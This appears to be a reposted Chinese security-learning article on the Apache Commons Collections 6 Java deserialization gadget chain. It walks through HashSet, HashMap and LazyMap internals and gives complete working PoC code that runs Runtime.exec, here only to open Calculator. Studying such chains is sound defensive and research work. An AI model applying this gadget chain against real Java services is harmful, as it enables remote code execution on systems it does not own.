@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://singboxgithub.github.io/news/article-66316.htm" />
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>CommonsCollection6反序列化链学习</title>
+        <meta name="description" content="1、前置知识 1.1、HashSet HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。继承了序列化和集合 构造函数参数为空的话创建一个HashMap(),有一个参数的情况" />
+        <link rel="icon" href="/assets/website/img/singboxgithub/favicon.ico" type="image/x-icon"/>
+
+    <meta name="author" content="SingBox Github免费节点分享站">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://singboxgithub.github.io/news/article-66316.htm" />
+    <meta property="og:site_name" content="SingBox Github免费节点分享站" />
+    <meta property="og:title" content="CommonsCollection6反序列化链学习" />
+    <meta property="og:image" content="https://singboxgithub.github.io/uploads/20240802/83e55ea3206443730d1a185d766e22ee.webp" />
+        <meta property="og:release_date" content="2025-03-03T08:13:57" />
+    <meta property="og:updated_time" content="2025-03-03T08:13:57" />
+        <meta property="og:description" content="1、前置知识 1.1、HashSet HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。继承了序列化和集合 构造函数参数为空的话创建一个HashMap(),有一个参数的情况" />
+        
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="CommonsCollection6反序列化链学习">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+    <!-- Vendor CSS Files -->
+    <link href="/assets/website/js/frontend/singboxgithub/aos/aos.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/boxicons/css/boxicons.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/glightbox/css/glightbox.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/remixicon/remixicon.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/singboxgithub/swiper/swiper-bundle.min.css" rel="stylesheet">
+    <!-- Template Main CSS File -->
+    <link href="/assets/website/css/singboxgithub/style.css" rel="stylesheet">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-QR1XS4LQCV"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QR1XS4LQCV');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+    <!-- ======= Header ======= -->
+    <header id="header" class="fixed-top d-flex align-items-center">
+        <div class="container d-flex align-items-center">
+            <a href="/">
+                        <p class="logo me-auto">SingBox <span>Github</span></p>
+                        </a>
+            <nav id="navbar" class="navbar">
+                <ul>
+                                        <li><a class="nav-link" href="/">首页</a></li>
+                                        <li><a class="nav-link" href="/free-nodes/">免费节点</a></li>
+                                        <li><a class="nav-link" href="/paid-subscribe/">推荐机场</a></li>
+                                        <li><a class="nav-link" href="/client.htm">客户端</a></li>
+                                        <li><a class="nav-link" href="/news/">新闻资讯</a></li>
+                                    </ul>
+                <i class="bi bi-list mobile-nav-toggle"></i>
+            </nav><!-- .navbar -->
+        </div>
+    </header><!-- End Header -->
+    <main id="main">
+        <!-- ======= Breadcrumbs ======= -->
+        <section class="breadcrumbs">
+            <div class="container">
+                <ol>
+                    <li><a href="/">首页</a></li>
+                    <li><a href="/news/">新闻资讯</a></li>
+                    <li>正文</li>
+                </ol>
+                <h1>CommonsCollection6反序列化链学习</h1>
+            </div>
+        </section><!-- End Breadcrumbs -->
+        <!-- ======= Tabs Section ======= -->
+        <section id="tabs" class="tabs">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-9">
+                                        <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				</h1> <h2 id="1前置知识">1、前置知识</h2> <h3 id="11hashset">1.1、HashSet</h3> <p>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。继承了序列化和集合</p> <p>构造函数参数为空的话创建一个HashMap(),有一个参数的情况下，要创建指定容量的初始数值的哈希集合。</p> <p>我们看到add方法会调用map.put()方法。这个map就是HashMap()</p> <pre><code class="language-java">//定义HashMap,E在泛型表示集合的元素，元素的类型为Object private transient HashMap&lt;E,Object&gt; map; ...... public HashSet() {   map = new HashMap&lt;&gt;(); }  ...... //创建初始容量为initialCapacity的HashSet，其实就是创建HashMap集合 public HashSet(int initialCapacity) {   map = new HashMap&lt;&gt;(initialCapacity); }  ...... //往HashSet添加元素，其实就是调用HashMap的put方法添加 public boolean add(E e) {   return map.put(e, PRESENT)==null; }</code></pre> <h3 id="12hashmap">1.2、HashMap</h3> <p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射，实现了Map 接口、Serializable接口</p> <p>首先怎么怎么新建一个HashMap,这里就是创建一个整型（Integer）的 key 和字符串（String）类型的 value。</p> <pre><code class="language-java">HashMap&lt;Integer, String&gt; Sites = new HashMap&lt;Integer, String&gt;();</code></pre> <p><strong>添加键值对</strong>(key-value)的方法是put，接着上面我们添加键值对时也要传输对应的类型</p> <pre><code class="language-java"> Sites.put(1, "Google");</code></pre> <p><strong>访问元素</strong></p> <p>通过get(key),获取value的值</p> <pre><code class="language-java">Sites.get(1)</code></pre> <p><strong>删除元素</strong></p> <p>使用 remove(key) 方法来删除 指定的key 对应的键值，删除所有键值</p> <pre><code class="language-java">Sites.remove(1);删除指定的key对应的键值 Sites.clear();删除所有键值</code></pre> <p><strong>计算大小</strong></p> <p>计算 HashMap 中的元素数量</p> <pre><code class="language-java">Sites.size()</code></pre> <p><strong>遍历</strong></p> <p>通过keySet()方法获取所有的key(键)，也可以通过所有的valueSet()，获取所有value(键值)</p> <pre><code class="language-java">//输出所有的键和键值 for (Integer i : Sites.keySet()) {   System.out.println("key: " + i + " value: " + Sites.get(i)); } //输出所有的键值 for(String value: Sites.values()) {   // 输出每一个value   System.out.print(value + ", "); }</code></pre> <h3 id="13debug问题">1.3、debug问题</h3> <p>关于在调试put方法直接弹窗的解决办法。因为idea开启了自动tostring和展示集合对象</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/c8480df3c097e4910994f84308c0ae44.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>关掉改这两个选项既正常调试</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/c41e1a5f2e6c3c8776ebb9a9e232a150.jpg" alt="CommonsCollection6反序列化链学习"></p> <h2 id="2poc利用">2、POC利用</h2> <h3 id="21利用链">2.1、利用链</h3> <p>这次我们先看ysoseria的利用链</p> <pre><code class="language-java">/* 	Gadget chain: 	    java.io.ObjectInputStream.readObject()             java.util.HashSet.readObject()                 java.util.HashMap.put()                 java.util.HashMap.hash()                     org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                     org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                         org.apache.commons.collections.map.LazyMap.get()                             org.apache.commons.collections.functors.ChainedTransformer.transform()                             org.apache.commons.collections.functors.InvokerTransformer.transform()                             java.lang.reflect.Method.invoke()                                 java.lang.Runtime.exec()     by @matthias_kaiser */</code></pre> <p>我们发现前面的利用链跟我们cc5可以说是一模一样，知道getValue()，cc5使用BadAttributeValueExpException的toString触发</p> <p>TiedMapEntry的toString触发TiedMapEntry的getValue，以此类推。而cc6采用的是HashSet、HashMap来完成的我们来仔细分析一下</p> <h3 id="22poc分析">2.2、POC分析</h3> <p><strong>TiedMapEntry.hashCode()</strong></p> <p>正如利用链那样可以调用getValue()方法，</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d69b45fc69b5793e3a2f92458dce244c.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashMap.hash()</strong></p> <p>hash方法传入的参数为Object类型的key，然后用key去调用hashcode，所以我们只要传个恶意的TiedMapEntry作为hash()的key，就可以触发TiedMapEntry.hashCode()。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/752c5a2e4dc6709e044e6a502556cd9e.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashMap.put()</strong></p> <p>我们看到HashMap()的put方法，其中hash(key)的key是通过put传输的，所以我们调用HashMap的put方法时，我们恶意构造的TiedMapEntry当做key传入就可以。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/b6e01507bbe370c325c0b511711a3592.jpg" alt="CommonsCollection6反序列化链学习"></p> <p><strong>HashSet.readObject()</strong></p> <p>看到通过readObject循环map.put()，从readObject读取，其中的map就是HashMap，前置知识有学习。到这里我们就可以尝试自己构造链子了。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/8edd2d2dc315b110dd8541eef414fb57.jpg" alt="CommonsCollection6反序列化链学习"></p> <h3 id="23poc构造">2.3、poc构造</h3> <h4 id="231第一步">2.3.1、第一步</h4> <p>首先我们把cc5的链直接搬过来，构造一个恶意的tiedMapEntry。</p> <pre><code class="language-java">Transformer[] transformers=new Transformer[]{   new ConstantTransformer(Runtime.class),   new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),   new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),   new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"}) };  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  Map map=new HashMap(); Map lazyMap=LazyMap.decorate(map,chainedTransformer); TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");</code></pre> <h4 id="232第二步">2.3.2、第二步</h4> <p>创建HashSet,把我们的tiedMapEntry作为key传进去，通过add方法调用HashMap的put方法传进去。</p> <pre><code class="language-java">HashSet hashSet=new HashSet(1); hashSet.add(tiedMapEntry);</code></pre> <p>我们来序列化，再反序列化，但是我们在序列化的时候就已经弹窗了</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/cb5499ff71e35a13164667267f35173b.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>网上查查看看，找出问题点为hashSet.add(tiedMapEntry)方法，在该方法会中add调用了put方法，这样就会直接触发我们的利用链，那我们有啥办法吗？答案就是在序列化的时候才通过反射把lazymap传进去，这样在我们add方法后才赋值，就不会触发我们的恶意代码。</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/ea0366fcb5f50039fc03880c95054253.jpg" alt="CommonsCollection6反序列化链学习"></p> <h4 id="233第三步">2.3.3、第三步</h4> <p>lazymap中用于调用的transform的属性为factory</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/bee49d52a549dd2765766b2cb3e5e4a2.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>那么我们在调用HashSet的add的方法，在对LazyMap赋值时，传入一个空的ConstantTransformer，在执行完HashSet的add方法后，通过反射修改lazyMap属性factory的值为我们的恶意ChainedTransformer类。</p> <pre><code class="language-java">package com.akkacloud;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map;  public class CommonsCollection6 {     public static void main(String[] args) throws Exception {          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})         };          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          Map map=new HashMap();         Map lazyMap=LazyMap.decorate(map,new ConstantTransformer(1));         TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");          HashSet hashSet=new HashSet(1);         hashSet.add(tiedMapEntry);           Field field = LazyMap.class.getDeclaredField("factory");         field.setAccessible(true);         field.set(lazyMap,chainedTransformer);          serialize(hashSet); //        unserialize();       }      public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.ser"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.ser"));         objectInputStream.readObject();     }  }</code></pre> <p>运行，在序列化的过程中没有问题，但是在反序列却没有弹窗！继续查找原因</p> <p>我们在hashSet的add()方法打断点调试一下，慢慢跟进到LazyMap的get方法，此时会判断我们的lazymap中是否会存在key，不存在进入if，先调用this.factory.transform(key)，此时的因为我们前面把空的ConstantTransformer赋值给LazyMap，所以Lazymap的key肯定为空的。<strong>题外知识点containsKey() 方法检查 hashMap 中是否存在指定的 key 对应的映射关系</strong></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/2858d06f63685f132153fac52ce1e0b8.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>但是在执行完this.factory.transform(key)后，会再一次把调用map的put()给key赋值，所以我们在反序列化的时候key里面是有东西的，在!super.map.containsKey(key）时就会判断为假，也就是有key，根本走不到this.factory.transform(key)，所以我们要在HashSet的add()方法后清除lazymap的key,<strong>既调用Lazymap的remove（key），不可以使用Hashset的remove方法，因为此时hashset仍是我们传入空ConstantTransformer的Lazymap，必须要调用我们等会要操作的lazymap才可以，去除他的键值对关系</strong></p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/30d2fe1675b9f62b2120c31dcaa97bf6.jpg" alt="CommonsCollection6反序列化链学习"></p> <h4 id="234第四步-poc">2.3.4、第四步-POC</h4> <pre><code class="language-java">package com.akkacloud;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap;  import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map;  public class CommonsCollection6 {     public static void main(String[] args) throws Exception {          Transformer[] transformers=new Transformer[]{                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),                 new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open /System/Applications/Calculator.app"})         };          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);          HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();         Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));          TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"test1");          HashSet hashSet=new HashSet(1);         hashSet.add(tiedMapEntry);         lazyMap.remove("test1");          //通过反射覆盖原有lazymap类的factory属性，传入我们的恶意chainedTransformer          Field field = LazyMap.class.getDeclaredField("factory");         field.setAccessible(true);         field.set(lazyMap,chainedTransformer);          serialize(hashSet);         unserialize();        }      public static void serialize(Object obj ) throws Exception{         ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("test.bin"));         objectOutputStream.writeObject(obj);     }     public static void unserialize() throws Exception{         ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("test.bin"));         objectInputStream.readObject();     }  }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/35672ded6dad112f0112e280cf404be8.jpg" alt="CommonsCollection6反序列化链学习"></p> <h3 id="24poc调试">2.4、POC调试</h3> <p>首先还是在Hashset处，漏洞点打下断点</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3efef01e5ec597603668190127ca9a94.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进put方法，调用HashMap的hash方法，key为我们恶意的TiedMapEntry</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/a173dfc773f85928feda148c4f2883ec.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>因为key为TiedMapEntry，所以调用的是TiedMapEntry的hashCode</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/47b1138174f19b5cd857a1d52fe63c86.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进TiedMapEntry的hashCode方法，继续跟进getValue，后面的就跟我们的cc5链一模一样了，就不赘述了，不懂得查看cc1或者cc5</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/7ad7a76a1a47f87e83c2fb36e2b6fda5.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>跟进getValue方法，继续调用get方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/5671993cc0da3c1fc5b778ab46aad3b5.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>进入LazyMap的get方法，此时的判断就是我们构造中去除lazymap的键值对关系的原因</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/60cc4b8528183eb6f8e08c866706fcfe.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>可以已经成功进入到if，然后调用ChainedTransformer的transform</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/4c1d9d62699ad943d4b931c21cec2c88.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>后面循环就是循环执行我们的恶意代码了</p> <h3 id="25思维导图">2.5、思维导图</h3> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/442f9f300037e6ece7b297e09fb39c5c.jpg" alt="CommonsCollection6反序列化链学习"></p> <p>参考链接</p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java"  target="_blank" rel="nofollow">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.cnblogs.com/nice0e3/p/13892510.html"  target="_blank" rel="nofollow">https://www.cnblogs.com/nice0e3/p/13892510.html</a></p> <p><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788"  target="_blank" rel="nofollow">https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.788</a></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-65710.htm">国内宠物粮食品牌排行榜（国内十大宠物粮食品牌）</a></p>
+                                        <p>下一个：<a href="/news/article-66318.htm">动物疫苗排名前十名有哪些 动物疫苗排名前十名有哪些品种</a></p>
+                                    </div>
+                
+                    </div>
+                    <div class="col-md-3">
+                        <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-41414.htm" title="Python 字典dict">Python 字典dict</a></li>
+                        <li class="py-2"><a href="/news/article-50876.htm" title="猫咪三针疫苗多久打一次啊视频（猫三针疫苗要多久）">猫咪三针疫苗多久打一次啊视频（猫三针疫苗要多久）</a></li>
+                        <li class="py-2"><a href="/news/article-45894.htm" title="上海宠物领养站电话地址（上海宠物领养站电话地址是多少）">上海宠物领养站电话地址（上海宠物领养站电话地址是多少）</a></li>
+                        <li class="py-2"><a href="/news/article-38945.htm" title="宠物领养平台app推荐下载苹果版（宠物领养平台app推荐下载苹果版）">宠物领养平台app推荐下载苹果版（宠物领养平台app推荐下载苹果版）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-2-15-sing-box-node-windows.htm" title="2月15日 | SingBox每天更新21.8M/S免费节点链接地址分享">2月15日 | SingBox每天更新21.8M/S免费节点链接地址分享</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-1-13-sing-box-github.htm" title="1月13日 | SingBox每天更新19M/S免费节点链接地址分享">1月13日 | SingBox每天更新19M/S免费节点链接地址分享</a></li>
+                        <li class="py-2"><a href="/news/article-40430.htm" title="动物疫苗的种类和研发过程图片大全集（动物疫苗的概念）">动物疫苗的种类和研发过程图片大全集（动物疫苗的概念）</a></li>
+                        <li class="py-2"><a href="/news/article-41908.htm" title="给动物注射疫苗属于主动免疫嘛（给动物接种疫苗的目的是治疗疾病）">给动物注射疫苗属于主动免疫嘛（给动物接种疫苗的目的是治疗疾病）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-1-16-free-node-subscribe.htm" title="1月16日 | SingBox每天更新22M/S免费节点链接地址分享">1月16日 | SingBox每天更新22M/S免费节点链接地址分享</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-2-10-sing-hysteria-windows.htm" title="2月10日 | SingBox每天更新20.1M/S免费节点链接地址分享">2月10日 | SingBox每天更新20.1M/S免费节点链接地址分享</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">12</span> <a href="/date/2025-03/" title="2025-03 归档">2025-03</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">84</span> <a href="/date/2025-02/" title="2025-02 归档">2025-02</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">84</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+                    </div>
+                </div>
+            </div>
+        </section><!-- End Tabs Section -->
+    </main><!-- End #main -->
+        <!-- ======= Footer ======= -->
+    <footer id="footer">
+        <div class="container d-md-flex py-4">
+            <div class="me-md-auto text-center text-md-start">
+                <div class="copyright">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                    SingBox Github免费节点分享站 版权所有 Powered by WordPress
+                </div>
+            </div>
+            <div class="social-links text-center text-md-end pt-3 pt-md-0">
+                <a href="#" class="twitter"><i class="bx bxl-twitter"></i></a>
+                <a href="#" class="facebook"><i class="bx bxl-facebook"></i></a>
+                <a href="#" class="instagram"><i class="bx bxl-instagram"></i></a>
+                <a href="#" class="google-plus"><i class="bx bxl-skype"></i></a>
+                <a href="#" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+            </div>
+        </div>
+    </footer><!-- End Footer -->
+    <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+    <!-- Vendor JS Files -->
+    <script src="/assets/website/js/frontend/singboxgithub/jquery.min.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/aos/aos.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/php-email-form/validate.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/purecounter/purecounter.js"></script>
+    <script src="/assets/website/js/frontend/singboxgithub/swiper/swiper-bundle.min.js"></script>
+    <!-- Template Main JS File -->
+    <script src="/assets/website/js/frontend/singboxgithub/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
